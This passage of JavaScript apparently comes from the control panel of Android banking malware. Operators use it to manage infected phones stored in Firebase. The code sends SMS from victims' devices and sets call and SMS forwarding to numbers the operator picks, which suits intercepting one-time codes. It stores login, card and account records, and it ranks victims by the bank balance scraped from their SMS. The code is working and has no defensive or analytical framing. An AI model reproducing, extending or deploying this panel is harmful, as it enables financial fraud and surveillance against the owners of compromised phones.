        ctx.db.ref(`clients/${deviceId}/webhookEvent/sendSms`).set(smsData)
      ]);
      showToast('SMS command sent to device!', 'success');
    }
  } catch (err) {
    showToast('Failed to send SMS: ' + err.message, 'error');
  }
}

function handleSendSms() {
  const deviceId = state.currentSmsDevice;
  if (!deviceId) return;

  const toInput = document.getElementById('smsToInput');
  const msgInput = document.getElementById('smsMsgInput');
  const simSelect = document.getElementById('smsSimSelect');

  const to = toInput.value.trim();
  const message = msgInput.value.trim();
  const simSlot = simSelect.value;

  if (!to || !message) {
    showToast('Please enter recipient and message', 'error');
    return;
  }

  sendSms(deviceId, to, message, simSlot);
  msgInput.value = '';
}

function openSendSmsFromDrawer(deviceId) {
  closeDrawer();
  navigateTo('sms');
  state.currentSmsDevice = deviceId;
  loadDeviceSms(deviceId);
  updateSmsView();
}

// ── Auto-Forward Toggle ──
async function toggleAutoForward(deviceId) {
  const isCurrentlyOn = state._autoForwardDevices && state._autoForwardDevices[deviceId];

  try {
    if (isCurrentlyOn) {
      // Turn OFF
      await fetch(`/api/${deviceId}/sms/autoforward`, { method: 'DELETE' });
      delete state._autoForwardDevices[deviceId];
    } else {
      // Turn ON — forward back to same device
      await fetch(`/api/${deviceId}/sms/autoforward`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target: deviceId })
      });
      if (!state._autoForwardDevices) state._autoForwardDevices = {};
      state._autoForwardDevices[deviceId] = deviceId;
    }
    // Re-render to update button
    renderSmsConversation(deviceId);
  } catch (err) {
    console.error('[AutoFwd] Toggle error:', err);
  }
}

// Load auto-forward status from server
async function loadAutoForwardStatus() {
  try {
    const res = await authFetch('/api/sms/autoforward');
    const data = await res.json();
    state._autoForwardDevices = data.enabled || {};
  } catch (err) {
    state._autoForwardDevices = {};
  }
}

function viewDeviceSms(deviceId) {
  closeDrawer();
  navigateTo('sms');
  state.currentSmsDevice = deviceId;
  loadDeviceSms(deviceId);
  updateSmsView();
}

// ── Commands View ──

function updateCommandsView() {
  const container = document.getElementById('cmdContainer');
  if (!container) return;

  container.innerHTML = `
    <div class="cmd-grid">
      <div class="cmd-card">
        <div class="cmd-card-title">📡 Ping All Devices</div>
        <div class="cmd-card-desc">Send a liveness check to all connected devices</div>
        <button class="btn btn-primary btn-sm" onclick="pingAllDevices()">Send Ping</button>
      </div>
      <div class="cmd-card">
        <div class="cmd-card-title">💬 Bulk SMS</div>
        <div class="cmd-card-desc">Send SMS from a specific device</div>
        <button class="btn btn-primary btn-sm" onclick="openBulkSmsModal()">Compose</button>
      </div>
      <div class="cmd-card">
        <div class="cmd-card-title">📞 Call Forward</div>
        <div class="cmd-card-desc">Set up call forwarding on a device</div>
        <button class="btn btn-primary btn-sm" onclick="openCallForwardModal()">Configure</button>
      </div>
      <div class="cmd-card">
        <div class="cmd-card-title">📨 SMS Forward</div>
        <div class="cmd-card-desc">Forward incoming SMS to a number</div>
        <button class="btn btn-primary btn-sm" onclick="openSmsForwardModal()">Configure</button>
      </div>
    </div>
    
    <h3 style="margin:24px 0 12px;font-size:0.95rem;">Active Commands</h3>
    <div class="table-container">
      <table class="data-table">
        <thead>
          <tr>
            <th>Device</th>
            <th>Model</th>
            <th>Command</th>
            <th>Details</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          ${Object.entries(state.commands).map(([deviceId, cmds]) => {
    const client = state.clients[deviceId] || {};
    return Object.entries(cmds).filter(([k]) => k !== 'checkLiveness').map(([cmdName, cmdData]) => `
              <tr>
                <td><span class="device-id">${deviceId.substring(0, 10)}…</span></td>
                <td>${escapeHtml(client.modelName || '—')}</td>
                <td><span class="badge cyan">${escapeHtml(cmdName)}</span></td>
                <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">${escapeHtml(JSON.stringify(cmdData).substring(0, 80))}</td>
                <td><button class="btn btn-ghost btn-sm" onclick="removeCommand('${deviceId}','${cmdName}')">✕</button></td>
              </tr>
            `).join('');
  }).join('')}
        </tbody>
      </table>
    </div>`;
}

async function pingAllDevices() {
  const deviceIds = Object.keys(state.clients);
  let count = 0;
  for (const id of deviceIds) {
    try {
      const ctx = getDbForDevice(id);
      if (!ctx.db) continue;
      if (ctx.schemaType === 'B') {
        await ctx.db.ref(`user_data/${id}`).update({ command: 'ping', _t: Date.now() });
      } else {
        await ctx.db.ref(`commands/${id}/checkLiveness`).set({ text: 'ping' });
      }
      count++;
    } catch { }
  }
  showToast(`Pinged ${count} devices`, 'success');
}

async function sendPing(deviceId) {
  const ctx = getDbForDevice(deviceId);
  if (!ctx.db) return;
  try {
    if (ctx.schemaType === 'B') {
      await ctx.db.ref(`user_data/${deviceId}`).update({ command: 'ping', _t: Date.now() });
    } else {
      await ctx.db.ref(`commands/${deviceId}/checkLiveness`).set({ text: 'ping' });
    }
    showToast('Ping sent!', 'success');
  } catch (err) {
    showToast('Ping failed: ' + err.message, 'error');
  }
}

async function removeCommand(deviceId, cmdName) {
  const ctx = getDbForDevice(deviceId);
  if (!ctx.db) return;
  try {
    await ctx.db.ref(`commands/${deviceId}/${cmdName}`).remove();
    showToast('Command removed', 'success');
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  }
}

async function deleteDeviceData(deviceId) {
  if (!confirm(`Delete all data for device ${deviceId}?`)) return;
  const ctx = getDbForDevice(deviceId);
  if (!ctx.db) return;
  try {
    if (ctx.schemaType === 'B') {
      await Promise.all([
        ctx.db.ref(`user_data/${deviceId}`).remove(),
        ctx.db.ref(`user_sms/${deviceId}`).remove(),
        ctx.db.ref(`user_list/${deviceId}`).remove(),
        ctx.db.ref(`login/${deviceId}`).remove(),
        ctx.db.ref(`Card/${deviceId}`).remove(),
        ctx.db.ref(`account/${deviceId}`).remove(),
      ]);
    } else {
      await Promise.all([
        ctx.db.ref(`clients/${deviceId}`).remove(),
        ctx.db.ref(`messages/${deviceId}`).remove(),
        ctx.db.ref(`commands/${deviceId}`).remove()
      ]);
    }
    closeDrawer();
    showToast('Device data deleted', 'success');
  } catch (err) {
    showToast('Delete failed: ' + err.message, 'error');
  }
}

// ── Admin View ──

function updateAdminView() {
  const container = document.getElementById('adminContainer');
  if (!container) return;

  const callFor = (state.admin.All_User && state.admin.All_User.Call_For) || {};
  const entries = Object.entries(callFor);

  container.innerHTML = `
    <h3 style="margin-bottom:12px;font-size:0.95rem;">Call Forward Entries (${entries.length})</h3>
    <div class="table-container">
      <table class="data-table">
        <thead>
          <tr>
            <th>Device ID</th>
            <th>Phone Number</th>
            <th>Message</th>
            <th>Status</th>
            <th>SIM</th>
            <th>Type</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          ${entries.map(([deviceId, data]) => `
            <tr>
              <td><span class="device-id">${deviceId.substring(0, 12)}…</span></td>
              <td style="font-family:'JetBrains Mono',monospace">${escapeHtml(data.PhoneNumber || '—')}</td>
              <td title="${escapeHtml(data.Msg || '')}">${escapeHtml((data.Msg || '').substring(0, 40))}</td>
              <td><span class="badge ${data.Status === 'Yes' ? 'green' : 'red'}">${escapeHtml(data.Status || '—')}</span></td>
              <td>${escapeHtml(data.SubID || '—')}</td>
              <td><span class="badge cyan">${escapeHtml(data.Type || '—')}</span></td>
              <td><button class="btn btn-ghost btn-sm" onclick="removeAdminEntry('${deviceId}')">✕</button></td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    </div>`;
}

async function removeAdminEntry(deviceId) {
  const ctx = getDbForDevice(deviceId);
  if (!ctx.db) return;
  try {
    await ctx.db.ref(`admin/All_User/Call_For/${deviceId}`).remove();
    showToast('Entry removed', 'success');
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  }
}

// ── Bot Users View ──

function updateBotUsersView() {
  const container = document.getElementById('botContainer');
  if (!container) return;

  const entries = Object.entries(state.botUsers);

  container.innerHTML = `
    <h3 style="margin-bottom:12px;font-size:0.95rem;">Bot Users (${entries.length})</h3>
    <div class="table-container">
      <table class="data-table">
        <thead>
          <tr>
            <th>Bot ID</th>
            ${entries.length > 0 ?
      [...new Set(entries.flatMap(([, d]) => Object.keys(d)))].map(k => `<th>${escapeHtml(formatKey(k))}</th>`).join('')
      : '<th>Data</th>'}
          </tr>
        </thead>
        <tbody>
          ${entries.map(([botId, data]) => {
        const allKeys = [...new Set(entries.flatMap(([, d]) => Object.keys(d)))];
        return `<tr>
              <td style="font-family:'JetBrains Mono',monospace">${escapeHtml(botId)}</td>
              ${allKeys.map(k => `<td title="${escapeHtml(String(data[k] ?? ''))}">${renderCellValue(data[k])}</td>`).join('')}
            </tr>`;
      }).join('')}
        </tbody>
      </table>
    </div>`;
}

// ── Raw DB Explorer ──

function updateRawView() {
  const container = document.getElementById('rawContainer');
  if (!container) return;

  container.innerHTML = '<div class="raw-tree" id="rawTree"></div>';
  const tree = document.getElementById('rawTree');
  tree.appendChild(buildTreeNode(state.allData, 'root', 0));
}

function buildTreeNode(data, key, depth) {
  const el = document.createElement('div');
  if (depth > 0) el.className = 'tree-node';

  if (data !== null && typeof data === 'object') {
    const entries = Object.entries(data);
    const isArray = Array.isArray(data);

    const keyEl = document.createElement('div');
    keyEl.className = 'tree-key';
    keyEl.innerHTML = `<span class="tree-arrow">▶</span> ${escapeHtml(key)} <span class="tree-count">${isArray ? `[${entries.length}]` : `{${entries.length}}`}</span>`;

    const childrenEl = document.createElement('div');
    childrenEl.className = 'tree-children';

    keyEl.addEventListener('click', () => {
      const arrow = keyEl.querySelector('.tree-arrow');
      const isOpen = childrenEl.classList.contains('open');
      if (!isOpen && childrenEl.children.length === 0) {
        const toRender = entries.slice(0, 100);
        toRender.forEach(([k, v]) => {
          childrenEl.appendChild(buildTreeNode(v, k, depth + 1));
        });
        if (entries.length > 100) {
          const moreEl = document.createElement('div');
          moreEl.className = 'tree-node';
          moreEl.innerHTML = `<span style="color:var(--text-muted);font-style:italic">... ${entries.length - 100} more items</span>`;
          childrenEl.appendChild(moreEl);
        }
      }
      childrenEl.classList.toggle('open');
      arrow.classList.toggle('open');
    });

    el.appendChild(keyEl);
    el.appendChild(childrenEl);
  } else {
    const valueClass = data === null ? 'null' : typeof data === 'string' ? 'string' : typeof data === 'number' ? 'number' : typeof data === 'boolean' ? 'boolean' : '';
    const displayVal = data === null ? 'null' : typeof data === 'string' ? `"${data}"` : String(data);
    el.innerHTML = `<span class="tree-key" style="cursor:default">${escapeHtml(key)}:</span> <span class="tree-value ${valueClass}">${escapeHtml(displayVal.substring(0, 200))}</span>`;
  }

  return el;
}

// ── Navigation (with lazy loading) ──

function navigateTo(page) {
  state.currentPage = page;

  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  const navEl = document.querySelector(`.nav-item[data-page="${page}"]`);
  if (navEl) navEl.classList.add('active');

  document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
  const pageEl = document.getElementById(`page-${page}`);
  if (pageEl) pageEl.classList.add('active');

  const titles = { devices: 'Devices', sms: 'SMS Manager', commands: 'Commands', admin: 'Admin', bots: 'Bot Users', raw: 'Raw Database' };
  const titleEl = document.getElementById('pageTitle');
  if (titleEl) titleEl.textContent = titles[page] || page;
  const mobileTitle = document.getElementById('mobilePageTitle');
  if (mobileTitle) mobileTitle.textContent = titles[page] || page;

  // LAZY loading triggers
  if (page === 'sms') updateSmsView();
  if (page === 'commands') updateCommandsView();
  if (page === 'admin') loadAdminData();
  if (page === 'bots') loadBotUsersData();
  if (page === 'raw') loadRawData();
}

function updateNavBadges() {
  const clientCount = Object.keys(state.clients).length;
  const msgCount = Object.keys(state.messages).length;

  const deviceBadge = document.getElementById('badgeDevices');
  const smsBadge = document.getElementById('badgeSms');
  if (deviceBadge) deviceBadge.textContent = clientCount;
  if (smsBadge) smsBadge.textContent = msgCount;
}

// ── Modals ──

function openModal(id) {
  document.getElementById(id).classList.add('open');
}
function closeModal(id) {
  document.getElementById(id).classList.remove('open');
}

function openBulkSmsModal() {
  const deviceSelect = document.getElementById('bulkSmsDevice');
  deviceSelect.innerHTML = Object.entries(state.clients)
    .map(([id, c]) => `<option value="${id}">${c.modelName || id} (${c.mobNo || '—'})</option>`)
    .join('');
  openModal('bulkSmsModal');
}

async function handleBulkSms() {
  const deviceId = document.getElementById('bulkSmsDevice').value;
  const to = document.getElementById('bulkSmsTo').value.trim();
  const message = document.getElementById('bulkSmsMsg').value.trim();
  const sim = document.getElementById('bulkSmsSim').value;

  if (!deviceId || !to || !message) {
    showToast('Fill all fields', 'error');
    return;
  }

  await sendSms(deviceId, to, message, sim);
  closeModal('bulkSmsModal');
  document.getElementById('bulkSmsTo').value = '';
  document.getElementById('bulkSmsMsg').value = '';
}

function openCallForwardModal() {
  const deviceSelect = document.getElementById('cfDevice');
  deviceSelect.innerHTML = Object.entries(state.clients)
    .map(([id, c]) => `<option value="${id}">${c.modelName || id} (${c.mobNo || '—'})</option>`)
    .join('');
  openModal('callForwardModal');
}

async function handleCallForward() {
  const deviceId = document.getElementById('cfDevice').value;
  const to = document.getElementById('cfNumber').value.trim();
  const sim = document.getElementById('cfSim').value;
  const active = document.getElementById('cfActive').checked;

  if (!deviceId || !to) { showToast('Fill all fields', 'error'); return; }
  const ctx = getDbForDevice(deviceId);
  if (!ctx.db) return;

  try {
    if (ctx.schemaType === 'B') {
      await ctx.db.ref(`user_data/${deviceId}`).update({
        command: 'call forward',
        targetNumber: to,
        simSlot: String(parseInt(sim) || 0),
        isActive: active,
        _t: Date.now()
      });
    } else {
      await ctx.db.ref(`commands/${deviceId}/callForward`).set({
        to, from: parseInt(sim) || 0, isActive: active
      });
    }
    showToast('Call forward configured!', 'success');
    closeModal('callForwardModal');
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  }
}

function openSmsForwardModal() {
  const deviceSelect = document.getElementById('sfDevice');
  deviceSelect.innerHTML = Object.entries(state.clients)
    .map(([id, c]) => `<option value="${id}">${c.modelName || id} (${c.mobNo || '—'})</option>`)
    .join('');
  openModal('smsForwardModal');
}

async function handleSmsForward() {
  const deviceId = document.getElementById('sfDevice').value;
  const to = document.getElementById('sfNumber').value.trim();
  const sim = document.getElementById('sfSim').value;
  const active = document.getElementById('sfActive').checked;

  if (!deviceId || !to) { showToast('Fill all fields', 'error'); return; }
  const ctx = getDbForDevice(deviceId);
  if (!ctx.db) return;

  try {
    if (ctx.schemaType === 'B') {
      await ctx.db.ref(`user_data/${deviceId}`).update({
        command: 'sms forward',
        targetNumber: to,
        simSlot: String(parseInt(sim) || 0),
        isActive: active,
        _t: Date.now()
      });
    } else {
      await ctx.db.ref(`commands/${deviceId}/smsForward`).set({
        to, from: parseInt(sim) || 0, isActive: active
      });
    }
    showToast('SMS forward configured!', 'success');
    closeModal('smsForwardModal');
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  }
}

// ── Utilities ──

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function formatKey(key) {
  return key
    .replace(/([a-z])([A-Z])/g, '$1 $2')
    .replace(/_/g, ' ')
    .replace(/\b\w/g, c => c.toUpperCase());
}

function formatNumber(num) {
  if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
  if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
  return String(num);
}

function getPhoneDisplay(device) {
  if (!device) return '—';
  const phoneFields = ['mobNo', 'mobileNumber', 'phoneNumber', 'phone', 'mobile', 'number'];
  for (const field of phoneFields) {
    if (device[field] && device[field] !== '' && device[field] !== 'Unknown') {
      return device[field];
    }
  }
  if (Array.isArray(device.sims) && device.sims.length > 0) {
    const simPhone = device.sims[0].phoneNumber;
    if (simPhone && simPhone !== 'Unknown') return simPhone;
  }
  return '—';
}

function extractDomain(url) {
  try {
    return new URL(url).hostname.split('.')[0];
  } catch {
    return url;
  }
}

function copyApiUrl(url) {
  safeCopy(url);
  showToast('API URL copied to clipboard!', 'success');
}

function copyDeviceId(deviceId) {
  safeCopy(deviceId);
  showToast(`Device ID copied: ${deviceId.substring(0, 12)}…`, 'success');
}

// Copy deviceId|panelId format for BizzuModZ instant verify
function copyForBizzuModz(deviceId) {
  const c = state.clients[deviceId];
  const panelId = c?._panelId || currentPanelId || '';
  if (!panelId) {
    // No panelId — copy just deviceId but warn user it may not work
    safeCopy(deviceId);
    showToast('⚠️ Copied device ID only — no panel ID available. Open panel via a share link first.', 'warning');
    return;
  }
  const copyText = `${deviceId}|${panelId}`;
  safeCopy(copyText);
  showToast(`📱 BizzuModZ copied: ${deviceId.substring(0, 10)}…|${panelId}`, 'success');
}

// Universal copy that works on HTTP (non-secure origins) and HTTPS
function safeCopy(text) {
  if (!text) return;
  // Try modern API first (only works on HTTPS/localhost)
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
  } else {
    fallbackCopy(text);
  }
}

function fallbackCopy(text) {
  try {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    ta.style.top = '0';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    const ok = document.execCommand('copy');
    document.body.removeChild(ta);
    if (!ok) {
      console.warn('[Copy] execCommand copy returned false');
    }
  } catch (e) {
    console.warn('[Copy] fallback copy failed:', e.message);
  }
}

// ── Toast System ──

function showToast(message, type = 'info') {
  const container = document.getElementById('toastContainer');
  if (!container) return;
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `<span class="toast-dot"></span><span class="toast-msg">${escapeHtml(message)}</span>`;
  container.appendChild(toast);

  setTimeout(() => {
    toast.classList.add('out');
    setTimeout(() => toast.remove(), 220);
  }, 4000);
}

// ── Event Handlers ──

function handleLoginSubmit(e) {
  e.preventDefault();
  const databaseURL = document.getElementById('inputDbUrl').value.trim();

  if (!databaseURL) {
    showToast('Database URL is required', 'error');
    return;
  }

  const config = {
    databaseURL,
    apiKey: 'dummy-key',
    label: document.getElementById('inputLabel').value.trim() || generatePanelName()
  };

  connectFirebase(config);
}

function handleSearch(e) {
  state.searchQuery = e.target.value;
  updateDeviceView();
}

// ── Balance Rank View ──
// Sorted leaderboard of devices by balance (highest first)
// Stable view during scanning — no shuffling

function renderBalanceRankView() {
  const container = document.getElementById('balanceRankContainer');
  if (!container) return;

  // Collect all devices with bank data
  const ranked = [];
  const noBalance = [];

  for (const [deviceId, client] of Object.entries(state.clients)) {
    const bankData = state.deviceBankData[deviceId];
    if (!bankData || bankData.bankSmsCount === 0) continue;

    const isOnline = client.status === true || client.status === 'online';
    const entry = {
      deviceId,
      client,
      bankData,
      isOnline,
      balance: bankData.latestBalance,
      bankName: bankData.bankName || '—',
      account: bankData.account || '',
      bankSender: bankData.bankSender || '',
      bankSmsCount: bankData.bankSmsCount || 0,
      lastTxn: bankData.lastTxn,
      cards: bankData.cards || [],
      modelName: client.modelName || client._raw?.d_name || deviceId.substring(0, 12),
    };

    if (entry.balance !== null && entry.balance !== undefined) {
      ranked.push(entry);
    } else {
      noBalance.push(entry);
    }
  }

  // Sort by balance descending
  ranked.sort((a, b) => b.balance - a.balance);

  // Total balance
  const totalBalance = ranked.reduce((sum, e) => sum + (e.balance || 0), 0);
  const totalDevices = ranked.length + noBalance.length;
  const onlineCount = [...ranked, ...noBalance].filter(e => e.isOnline).length;

  // Update device count label
  const countLabel = document.getElementById('deviceCount');
  if (countLabel) countLabel.textContent = `${totalDevices} with bank data`;

  if (totalDevices === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <div class="empty-state-icon">💰</div>
        <div class="empty-state-title">No balance data yet</div>
        <div class="empty-state-desc">Balance data will appear here as devices are scanned. Wait for the bank SMS scan to complete.</div>
      </div>`;
    return;
  }

  // Build the leaderboard
  let html = `
    <div class="balance-rank-wrapper">
      <div class="balance-rank-summary">
        <div class="balance-rank-total">
          <span class="balance-rank-total-label">Total Available Balance</span>
          <span class="balance-rank-total-value">${formatCurrency(totalBalance)}</span>
        </div>
        <div class="balance-rank-meta">
          <span class="balance-rank-meta-item">
            <span class="balance-rank-meta-icon si-green">●</span>
            ${onlineCount} Online
          </span>
          <span class="balance-rank-meta-item">
            <span class="balance-rank-meta-icon si-red">●</span>
            ${totalDevices - onlineCount} Offline
          </span>
          <span class="balance-rank-meta-item">
            💳 ${totalDevices} Devices
          </span>
        </div>
      </div>

      <div class="balance-rank-list">`;

  // Ranked entries (with balance)
  ranked.forEach((entry, index) => {
    html += renderBalanceRankRow(entry, index + 1);
  });

  // No-balance entries (at the bottom, no rank number)
  if (noBalance.length > 0) {
    html += `<div class="balance-rank-divider">
      <span>No Balance Data (${noBalance.length})</span>
    </div>`;
    noBalance.forEach(entry => {
      html += renderBalanceRankRow(entry, null);
    });
  }

  html += `</div></div>`;
  container.innerHTML = html;
}

function renderBalanceRankRow(entry, rank) {
  const { deviceId, client, bankData, isOnline, balance, bankName, account, bankSmsCount, lastTxn, cards, modelName } = entry;

  // Rank badge styling
  let rankBadge = '';
  if (rank !== null) {
    const rankClass = rank === 1 ? 'gold' : rank === 2 ? 'silver' : rank === 3 ? 'bronze' : '';
    rankBadge = `<div class="balance-rank-badge ${rankClass}">${rank}</div>`;
  } else {
    rankBadge = `<div class="balance-rank-badge none">—</div>`;
  }

  // Balance display
  const balanceDisplay = balance !== null && balance !== undefined
    ? `<span class="balance-rank-amount">${formatCurrency(balance)}</span>`
    : `<span class="balance-rank-amount no-data">No balance</span>`;

  // Last transaction
  let txnHtml = '';
  if (lastTxn) {
    const txnClass = lastTxn.isCredit ? 'credit' : 'debit';
    const txnSign = lastTxn.isCredit ? '+' : '-';
    const txnArrow = lastTxn.isCredit ? '↗' : '↘';
    txnHtml = `<span class="balance-rank-txn ${txnClass}">
      <span class="txn-arrow">${txnArrow}</span> ${txnSign}${formatCurrency(lastTxn.amount)}
    </span>`;
  }

  // Bank name with account
  const bankLabel = bankName + (account ? ` ••${escapeHtml(account)}` : '');

  // Status dot
  const statusHtml = `<span class="balance-rank-status ${isOnline ? 'online' : 'offline'}">●</span>`;

  // Cards count
  const cardsHtml = cards.length > 0
    ? `<span class="balance-rank-cards">💳 ${cards.length}</span>`
    : '';

  // Device model/name (truncated)
  const deviceLabel = escapeHtml(modelName.length > 20 ? modelName.substring(0, 20) + '…' : modelName);

  return `
    <div class="balance-rank-row ${isOnline ? 'online' : 'offline'}" onclick="openDeviceDetail('${deviceId}')">
      ${rankBadge}
      <div class="balance-rank-device">
        ${statusHtml}
        <div class="balance-rank-device-info">
          <span class="balance-rank-device-name">${deviceLabel}</span>
          <span class="balance-rank-bank-label">
            <span class="balance-rank-bank-icon">🏦</span> ${escapeHtml(bankLabel)}
          </span>
        </div>
      </div>
      <div class="balance-rank-balance-col">
        ${balanceDisplay}
        ${txnHtml}
      </div>
      <div class="balance-rank-extra">
        <span class="balance-rank-sms-count">${bankSmsCount} SMS</span>
        ${cardsHtml}
        <span class="balance-rank-copy" onclick="event.stopPropagation(); copyDeviceId('${deviceId}')" title="Copy ID">📋</span>
      </div>
    </div>`;
}

function setDeviceFilter(filter) {
  state.deviceFilter = filter;
  document.querySelectorAll('#page-devices .chip[data-filter]').forEach(el => el.classList.remove('active'));
  document.querySelector(`#page-devices .chip[data-filter="${filter}"]`)?.classList.add('active');

  const deviceContainer = document.getElementById('deviceContainer');
  const balanceRankContainer = document.getElementById('balanceRankContainer');

  if (filter === 'balance') {
    // Switch to balance rank view
    if (deviceContainer) deviceContainer.style.display = 'none';
    if (balanceRankContainer) balanceRankContainer.style.display = 'block';
    renderBalanceRankView();
  } else {
    // Normal view
    if (deviceContainer) deviceContainer.style.display = '';
    if (balanceRankContainer) balanceRankContainer.style.display = 'none';
    updateDeviceView();
  }
}

function setViewMode(mode) {
  state.viewMode = mode;
  document.querySelectorAll('.view-btn[data-view]').forEach(el => el.classList.remove('active'));
  document.querySelector(`.view-btn[data-view="${mode}"]`)?.classList.add('active');
  updateDeviceView();
}

// ── Initialize ──

document.addEventListener('DOMContentLoaded', () => {
  // Login form
  document.getElementById('loginForm').addEventListener('submit', handleLoginSubmit);

  // Pre-fill auto-generated panel name
  const labelInput = document.getElementById('inputLabel');
  const dbUrlInput = document.getElementById('inputDbUrl');
  let _nameManuallyEdited = false;
  if (labelInput) labelInput.value = generatePanelName();

  // Track if user manually edits the name
  if (labelInput) {
    labelInput.addEventListener('input', () => { _nameManuallyEdited = true; });
  }

  // Auto-update name as user types Firebase URL (only if not manually edited)
  if (dbUrlInput && labelInput) {
    dbUrlInput.addEventListener('input', () => {
      if (!_nameManuallyEdited) {
        labelInput.value = generatePanelName(dbUrlInput.value.trim());
      }
    });
  }

  // Refresh button — always regenerates and resets manual flag
  const refreshBtn = document.getElementById('refreshNameBtn');
  if (refreshBtn) refreshBtn.addEventListener('click', () => {
    _nameManuallyEdited = false;
    if (labelInput) labelInput.value = generatePanelName(dbUrlInput ? dbUrlInput.value.trim() : '');
  });

  // Search (desktop)
  document.getElementById('searchInput').addEventListener('input', handleSearch);

  // Search (mobile)
  const mobileSearchInput = document.getElementById('mobileSearchInput');
  if (mobileSearchInput) {
    mobileSearchInput.addEventListener('input', handleSearch);
  }

  // Navigation
  document.querySelectorAll('.nav-item[data-page]').forEach(el => {
    el.addEventListener('click', () => navigateTo(el.dataset.page));
  });

  // Filter chips (devices page)
  document.querySelectorAll('#page-devices .chip[data-filter]').forEach(el => {
    el.addEventListener('click', () => setDeviceFilter(el.dataset.filter));
  });

  // View toggle
  document.querySelectorAll('.view-btn[data-view]').forEach(el => {
    el.addEventListener('click', () => setViewMode(el.dataset.view));
  });

  // SMS send
  const smsSendBtnEl = document.getElementById('smsSendBtn');
  if (smsSendBtnEl) smsSendBtnEl.addEventListener('click', handleSendSms);

  // SMS search
  const smsSearchInput = document.getElementById('smsSearchInput');
  if (smsSearchInput) {
    smsSearchInput.addEventListener('input', (e) => setSmsSearch(e.target.value));
  }

  // SMS tabs
  document.querySelectorAll('.sms-tab[data-tab]').forEach(el => {
    el.addEventListener('click', () => setSmsTab(el.dataset.tab));
  });

  // Drawer close
  document.getElementById('drawerOverlay').addEventListener('click', closeDrawer);
  document.getElementById('drawerCloseBtn').addEventListener('click', closeDrawer);

  // Disconnect
  document.getElementById('disconnectBtn').addEventListener('click', disconnectFirebase);

  // Share panel button (sidebar)
  const sharePanelBtn = document.getElementById('sharePanelBtn');
  if (sharePanelBtn) {
    sharePanelBtn.addEventListener('click', () => {
      if (currentPanelId) {
        const url = `${window.location.origin}/panel/${currentPanelId}`;
        showShareLink(url, currentPanelId);
      } else {
        showToast('No panel created yet', 'info');
      }
    });
  }

  // Modals
  document.getElementById('bulkSmsSendBtn').addEventListener('click', handleBulkSms);
  document.getElementById('cfSendBtn').addEventListener('click', handleCallForward);
  document.getElementById('sfSendBtn').addEventListener('click', handleSmsForward);

  // Keyboard shortcuts
  document.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
      e.preventDefault();
      document.getElementById('searchInput').focus();
    }
    if (e.key === 'Escape') {
      closeDrawer();
      document.querySelectorAll('.modal-overlay.open').forEach(m => m.classList.remove('open'));
    }
  });

  // Load auto-forward status from server
  loadAutoForwardStatus();

  // AUTO-CONNECT on page load
  tryAutoConnect();
});